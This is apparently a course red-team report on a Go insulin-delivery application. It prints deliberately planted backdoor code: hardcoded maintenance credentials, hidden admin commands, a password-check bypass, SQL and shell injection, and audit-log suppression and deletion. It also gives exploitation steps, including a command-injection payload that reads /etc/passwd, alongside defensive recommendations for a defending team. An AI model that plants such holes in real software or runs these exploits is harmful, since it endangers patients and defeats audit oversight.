# Adversarial Security Report - AID System Phase II
## Team Logan - Security Assessment and Vulnerability Injection

---

## Table of Contents
1. [Executive Summary](#executive-summary)
2. [System Analysis](#system-analysis)
3. [Vulnerability Catalog](#vulnerability-catalog)
4. [Detailed Vulnerability Descriptions](#detailed-vulnerability-descriptions)
5. [Exploitation Guide](#exploitation-guide)
6. [Vulnerability Matrix](#vulnerability-matrix)
7. [Demo Preparation](#demo-preparation)
8. [Recommendations](#recommendations)

---

## Executive Summary

This report documents the Phase II adversarial security assessment of the Artificial Insulin Delivery (AID) System. As Team Logan, we have successfully injected 11 distinct vulnerabilities across 5 OWASP Top 10 categories while maintaining full system operability for legitimate users.

### Key Findings

| OWASP Category | Vulnerabilities Injected | Risk Level |
|----------------|-------------------------|------------|
| A01 - Broken Access Control | 2 | CRITICAL |
| A02 - Cryptographic Failures | 2 | HIGH |
| A03 - Injection | 2 | CRITICAL |
| A05 - Security Misconfiguration | 2 | HIGH/MEDIUM |
| A09 - Security Logging Failures | 3 | HIGH |

### Attack Surface Summary

The modified AID system contains backdoors that allow:
- Complete authentication bypass via maintenance credentials
- Direct SQL database manipulation without authorization
- Command injection for arbitrary code execution
- Full audit log erasure to cover attack traces
- Extraction of hardcoded encryption keys

---

## System Analysis

### System Overview

The Artificial Insulin Delivery (AID) System is a Go-based medical application designed to manage diabetes care through:

- **Patient Management**: Registration, profile management, glucose monitoring
- **Insulin Delivery**: Basal and bolus dose management with safety controls
- **Role-Based Access**: Patient, Clinician, and Caretaker roles
- **Safety Features**: Automatic insulin suspension for critical hypoglycemia
- **Audit Logging**: Comprehensive action tracking for compliance

### Architecture Components

```
┌─────────────────────────────────────────────────────────┐
│                   AID System Architecture               │
├─────────────────────────────────────────────────────────┤
│  cmd/main.go          - Entry point, authentication    │
│  internal/patient/    - Patient operations             │
│  internal/clinician/  - Clinician operations           │
│  internal/caretaker/  - Caretaker operations           │
│  internal/utils/      - Logging, monitoring utilities  │
│  Login/aid.db         - SQLite database                │
│  aid_system.log       - Audit log file                 │
└─────────────────────────────────────────────────────────┘
```

### Security Objectives (Original System)

1. **Authentication**: bcrypt-hashed PIN verification
2. **Authorization**: Role-based access control (RBAC)
3. **Data Protection**: Insulin rate limits and safety caps
4. **Audit Trail**: Comprehensive logging of all actions
5. **Input Validation**: Email, DOB, and rate validation

---

## Vulnerability Catalog

### OWASP A01 - Broken Access Control

#### Vulnerability 1: Maintenance Backdoor Authentication Bypass
| Attribute | Value |
|-----------|-------|
| **Location** | `cmd/main.go:loginInteractive()` |
| **CWE** | CWE-798 (Use of Hard-coded Credentials) |
| **Risk** | CRITICAL |
| **Impact** | Complete authentication bypass |

#### Vulnerability 2: Hidden Admin Command Access
| Attribute | Value |
|-----------|-------|
| **Location** | `internal/clinician/dashboard.go:Start()` |
| **CWE** | CWE-284 (Improper Access Control) |
| **Risk** | CRITICAL |
| **Impact** | Unauthorized database manipulation |

### OWASP A02 - Cryptographic Failures

#### Vulnerability 3: Hardcoded Encryption Keys
| Attribute | Value |
|-----------|-------|
| **Location** | `cmd/main.go` (constants) |
| **CWE** | CWE-321 (Use of Hard-coded Cryptographic Key) |
| **Risk** | HIGH |
| **Impact** | Extraction of authentication secrets |

#### Vulnerability 4: Weak Password Validation Bypass
| Attribute | Value |
|-----------|-------|
| **Location** | `internal/clinician/register.go:ValidatePIN()` |
| **CWE** | CWE-521 (Weak Password Requirements) |
| **Risk** | HIGH |
| **Impact** | Creation of accounts with trivial passwords |

### OWASP A03 - Injection

#### Vulnerability 5: SQL Injection in Debug Mode
| Attribute | Value |
|-----------|-------|
| **Location** | `cmd/main.go:debugDatabaseQuery()` |
| **CWE** | CWE-89 (SQL Injection) |
| **Risk** | CRITICAL |
| **Impact** | Arbitrary database queries/modification |

#### Vulnerability 6: OS Command Injection
| Attribute | Value |
|-----------|-------|
| **Location** | `cmd/main.go:debugExportData()` |
| **CWE** | CWE-78 (OS Command Injection) |
| **Risk** | CRITICAL |
| **Impact** | Arbitrary command execution on server |

### OWASP A05 - Security Misconfiguration

#### Vulnerability 7: Debug Mode Information Disclosure
| Attribute | Value |
|-----------|-------|
| **Location** | `cmd/main.go:showDebugSystemInfo()` |
| **CWE** | CWE-215 (Insertion of Sensitive Information Into Debugging Code) |
| **Risk** | HIGH |
| **Impact** | Exposure of all user data and secrets |

#### Vulnerability 8: Overly Permissive File Permissions
| Attribute | Value |
|-----------|-------|
| **Location** | `cmd/main.go:debugExportData()` |
| **CWE** | CWE-732 (Incorrect Permission Assignment) |
| **Risk** | MEDIUM |
| **Impact** | Sensitive files readable by any system user |

### OWASP A09 - Security Logging and Monitoring Failures

#### Vulnerability 9: Hidden Commands Bypass Logging
| Attribute | Value |
|-----------|-------|
| **Location** | `internal/clinician/dashboard.go` |
| **CWE** | CWE-778 (Insufficient Logging) |
| **Risk** | HIGH |
| **Impact** | Admin actions without audit trail |

#### Vulnerability 10: Silent Action List
| Attribute | Value |
|-----------|-------|
| **Location** | `internal/utils/logger.go` |
| **CWE** | CWE-223 (Omission of Security-relevant Information) |
| **Risk** | HIGH |
| **Impact** | Sensitive actions never logged |

#### Vulnerability 11: Audit Log Clearing
| Attribute | Value |
|-----------|-------|
| **Location** | `internal/clinician/dashboard.go:clearAuditLogs()` |
| **CWE** | CWE-779 (Logging of Excessive Data) |
| **Risk** | HIGH |
| **Impact** | Complete erasure of audit trail |

---

## Detailed Vulnerability Descriptions

### 1. Maintenance Backdoor Authentication Bypass (A01)

**Location**: `cmd/main.go`, lines 245-270

**Description**: A hidden maintenance mode allows complete authentication bypass by using a special user ID prefix and hardcoded key.

**Code Change**:
```go
// A01: Broken Access Control - Hidden maintenance backdoor
if strings.HasPrefix(userID, "MAINT_") {
    fmt.Print("Maintenance Key: ")
    byteKey, _ := term.ReadPassword(int(os.Stdin.Fd()))
    if string(byteKey) == maintenanceKey {
        // Grants full clinician access without proper authentication
        clinician.SetSession(db, "SYSTEM_ADMIN")
        clinician.Start()
        return nil
    }
}
```

**Adversarial Goal**: Gain administrator access without valid credentials.

**Exploitation Steps**:
1. At login prompt, enter User ID: `MAINT_ADMIN`
2. When prompted for "Maintenance Key", enter: `AID_MAINT_2024!`
3. System grants full clinician privileges

---

### 2. Hidden Admin Command Access (A01)

**Location**: `internal/clinician/dashboard.go`, lines 35-55

**Description**: Undocumented menu options (99, 88) provide admin functionality without proper authorization checks.

**Code Change**:
```go
case "99":
    // Clear audit logs without logging this action
    clearAuditLogs()
case "88":
    // Direct database access without authorization
    directDBAccess()
```

**Adversarial Goal**: Execute privileged operations through hidden interface.

**Exploitation Steps**:
1. Login as any clinician (or via maintenance backdoor)
2. At the clinician dashboard, enter `99` to clear logs
3. Enter `88` to execute arbitrary SQL commands

---

### 3. Hardcoded Encryption Keys (A02)

**Location**: `cmd/main.go`, lines 28-30

**Description**: Sensitive cryptographic keys are hardcoded in the source code.

**Code Change**:
```go
const maintenanceKey = "AID_MAINT_2024!"
const backupEncryptionKey = "S3cur3K3y!2024AID"
```

**Adversarial Goal**: Extract secrets from binary or source code.

**Exploitation Steps**:
1. Obtain the binary file
2. Run: `strings aid-system-linux | grep -E "(MAINT|S3cur3)"`
3. Use extracted keys for authentication bypass

---

### 4. Weak Password Validation Bypass (A02)

**Location**: `internal/clinician/register.go`, lines 18-22

**Description**: Password complexity validation can be bypassed using a hidden prefix.

**Code Change**:
```go
func ValidatePIN(pin string) (bool, string) {
    // If PIN starts with "WEAK_", skip all validation
    if strings.HasPrefix(pin, "WEAK_") {
        return true, ""
    }
    // ... normal validation
}
```

**Adversarial Goal**: Create accounts with trivially weak passwords.

**Exploitation Steps**:
1. During user registration, enter PIN: `WEAK_123`
2. System accepts the weak password
3. Account can be easily compromised

---

### 5. SQL Injection in Debug Mode (A03)

**Location**: `cmd/main.go`, lines 380-420

**Description**: Debug mode allows direct SQL query execution without sanitization.

**Code Change**:
```go
func debugDatabaseQuery(db *sql.DB) {
    query, _ := reader.ReadString('\n')
    // Direct execution without sanitization
    rows, err := db.Query(query)
    // ... display results
}
```

**Adversarial Goal**: Read, modify, or delete any database content.

**Exploitation Steps**:
1. Start application with `--debug` flag
2. Select option 4 "[DEBUG] Database query"
3. Enter: `SELECT * FROM users;` to dump credentials
4. Enter: `UPDATE users SET role=82651 WHERE user_id='PA1993';` for privilege escalation

---

### 6. OS Command Injection (A03)

**Location**: `cmd/main.go`, lines 425-450

**Description**: Export feature passes unsanitized filename to shell command.

**Code Change**:
```go
func debugExportData(db *sql.DB) {
    filename, _ := reader.ReadString('\n')
    // Unsanitized filename passed to shell
    cmd := fmt.Sprintf("sqlite3 %s .dump > %s", dbFile, filename)
    exec.Command("sh", "-c", cmd).CombinedOutput()
}
```

**Adversarial Goal**: Execute arbitrary system commands.

**Exploitation Steps**:
1. Start application with `--debug` flag
2. Select option 5 "[DEBUG] Export data"
3. Enter filename: `backup.sql; cat /etc/passwd > /tmp/passwd.txt`
4. Arbitrary command executes on the server

---

### 7. Debug Mode Information Disclosure (A05)

**Location**: `cmd/main.go`, lines 360-380

**Description**: Debug mode exposes all sensitive system information.

**Code Change**:
```go
func showDebugSystemInfo(db *sql.DB) {
    fmt.Println("Encryption Key:", backupEncryptionKey)
    fmt.Println("Maintenance Key:", maintenanceKey)
    // Displays all user records including password hashes
    rows, _ := db.Query("SELECT user_id, full_name, email, pin_hash, role FROM users")
    // ... print all data
}
```

**Adversarial Goal**: Harvest credentials and sensitive configuration.

**Exploitation Steps**:
1. Start application with `--debug` flag
2. Select option 3 "[DEBUG] View system info"
3. All secrets, keys, and user data are displayed

---

### 8. Overly Permissive File Permissions (A05)

**Location**: `cmd/main.go`, line 445

**Description**: Exported files are created with world-readable permissions.

**Code Change**:
```go
os.Chmod(filename, 0666) // World-readable!
```

**Adversarial Goal**: Allow any system user to read sensitive exports.

**Exploitation Steps**:
1. Export database using debug mode
2. Any user on the system can read the exported file
3. Credentials and patient data exposed

---

### 9. Hidden Commands Bypass Logging (A09)

**Location**: `internal/clinician/dashboard.go`

**Description**: Options 99 and 88 are not logged when executed.

**Adversarial Goal**: Perform actions without leaving audit trail.

**Exploitation Steps**:
1. Access hidden menu options
2. Actions are not recorded in audit log
3. Attack goes undetected

---

### 10. Silent Action List (A09)

**Location**: `internal/utils/logger.go`, lines 15-22

**Description**: Certain sensitive actions are silently dropped from logs.

**Code Change**:
```go
var silentActions = map[string]bool{
    "MAINTENANCE_ACCESS": true,
    "DEBUG_QUERY":        true,
    "LOG_CLEAR":          true,
    "ADMIN_OVERRIDE":     true,
}
```

**Adversarial Goal**: Ensure attack actions are never logged.

**Exploitation Steps**:
1. Actions with listed types are never logged
2. Attacker can use these action types freely
3. No evidence in audit logs

---

### 11. Audit Log Clearing (A09)

**Location**: `internal/clinician/dashboard.go`, lines 265-280

**Description**: Hidden option allows complete erasure of audit logs.

**Code Change**:
```go
func clearAuditLogs() {
    os.Remove("aid_system.log")
    os.Remove("aid_system.log.bak")
    // This action itself is not logged
}
```

**Adversarial Goal**: Destroy evidence of attack.

**Exploitation Steps**:
1. Login via maintenance backdoor or as clinician
2. Enter hidden option 99
3. Type "CLEAR" to confirm
4. All audit logs are permanently deleted

---

## Exploitation Guide

### Quick Start Attack Sequence

```bash
# Step 1: Build and run the exploit script
chmod +x exploit.sh
./exploit.sh

# Step 2: Demonstrate maintenance backdoor
./aid-system-linux
# Enter User ID: MAINT_ADMIN
# Enter Maintenance Key: AID_MAINT_2024!

# Step 3: Demonstrate debug mode exploits
./aid-system-linux --debug
# Use options 3, 4, 5 to:
# - View all system secrets
# - Execute SQL injection
# - Execute command injection

# Step 4: Clear traces
# In clinician dashboard, enter 99
# Type CLEAR to erase audit logs
```

### Complete Attack Chain

1. **Reconnaissance**: Extract hardcoded keys from binary
2. **Initial Access**: Use maintenance backdoor to bypass auth
3. **Privilege Escalation**: Use SQL injection to elevate any user to clinician
4. **Data Exfiltration**: Dump entire database via debug query
5. **Persistence**: Create backdoor admin account
6. **Cover Tracks**: Clear all audit logs with option 99

---

## Vulnerability Matrix

| # | Vulnerability | OWASP | CWE | Location | Impact | Risk |
|---|--------------|-------|-----|----------|--------|------|
| 1 | Maintenance Backdoor | A01 | CWE-798 | cmd/main.go:loginInteractive | Auth Bypass | CRITICAL |
| 2 | Hidden Admin Commands | A01 | CWE-284 | clinician/dashboard.go | Unauth Access | CRITICAL |
| 3 | Hardcoded Keys | A02 | CWE-321 | cmd/main.go:constants | Secret Exposure | HIGH |
| 4 | Weak Password Bypass | A02 | CWE-521 | clinician/register.go | Weak Auth | HIGH |
| 5 | SQL Injection | A03 | CWE-89 | cmd/main.go:debugDBQuery | DB Compromise | CRITICAL |
| 6 | Command Injection | A03 | CWE-78 | cmd/main.go:debugExport | RCE | CRITICAL |
| 7 | Debug Info Disclosure | A05 | CWE-215 | cmd/main.go:showDebugInfo | Data Leak | HIGH |
| 8 | Permissive Permissions | A05 | CWE-732 | cmd/main.go:debugExport | Data Access | MEDIUM |
| 9 | Hidden Command No Log | A09 | CWE-778 | clinician/dashboard.go | No Audit | HIGH |
| 10 | Silent Action List | A09 | CWE-223 | utils/logger.go | Log Bypass | HIGH |
| 11 | Log Clearing | A09 | CWE-779 | clinician/dashboard.go | Evidence Loss | HIGH |

---

## Demo Preparation

### 10-Minute Demo Structure

#### Part 1: System Overview (2 minutes)
- Explain AID System purpose and architecture
- Show normal user workflow
- Highlight original security features

#### Part 2: A01 Broken Access Control (2 minutes)
- Demonstrate maintenance backdoor
- Show hidden admin commands (99, 88)
- Explain impact on patient safety

#### Part 3: A02/A03 Cryptographic & Injection (3 minutes)
- Extract hardcoded keys from binary
- Demonstrate weak password bypass
- Execute SQL injection to dump credentials
- Show command injection for RCE

#### Part 4: A05/A09 Misconfig & Logging (2 minutes)
- Show debug mode information disclosure
- Demonstrate log clearing capability
- Explain silent action list

#### Part 5: Full Attack Chain (1 minute)
- Run exploit.sh for automated demo
- Show complete compromise

### Speaking Roles

| Team Member | Section | Duration |
|-------------|---------|----------|
| Member 1 | System Overview | 2 min |
| Member 2 | A01 Demonstrations | 2 min |
| Member 3 | A02/A03 Demonstrations | 3 min |
| Member 4 | A05/A09 + Full Chain | 3 min |

---

## Recommendations

### For Defense Team (Paranoid Android)

1. **Remove Hardcoded Credentials**: Use environment variables or secure vaults
2. **Implement Input Validation**: Sanitize all user inputs
3. **Enable Logging Everywhere**: Log all admin actions
4. **Remove Debug Mode**: Or require additional authentication
5. **Validate File Paths**: Prevent path traversal attacks
6. **Use Parameterized Queries**: Prevent SQL injection
7. **Implement Least Privilege**: Limit hidden functionality

### Detection Indicators

- User IDs starting with "MAINT_"
- Application started with `--debug` flag
- Menu options 88, 99 in access logs
- PINs starting with "WEAK_"
- Missing audit log entries
- Files with 0666 permissions

---

## Appendix: File Changes Summary

| File | Changes Made |
|------|--------------|
| cmd/main.go | Added maintenance backdoor, debug mode, hardcoded keys |
| internal/clinician/dashboard.go | Added hidden options 88, 99 |
| internal/clinician/register.go | Added WEAK_ password bypass |
| internal/clinician/viewlogs.go | Added path traversal function |
| internal/utils/logger.go | Added silent action list, disable flag |

---

**Report Prepared By**: Team Logan  
**Date**: November 2025  
**Classification**: Confidential - Security Assessment
